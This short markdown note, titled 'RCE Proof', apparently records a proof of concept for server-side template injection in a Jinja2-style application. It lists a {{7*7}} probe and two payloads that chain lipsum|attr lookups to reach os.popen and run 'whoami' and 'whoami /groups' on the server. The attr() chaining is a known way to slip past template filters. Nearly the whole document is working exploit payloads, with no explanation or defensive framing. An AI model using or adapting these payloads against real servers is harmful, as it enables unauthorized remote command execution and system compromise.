# RCE Proof

SSTI calc: `{{7*7}}`

whoami: `{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('whoami')|attr('read')()}}`

id: `{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('whoami /groups')|attr('read')()}}`
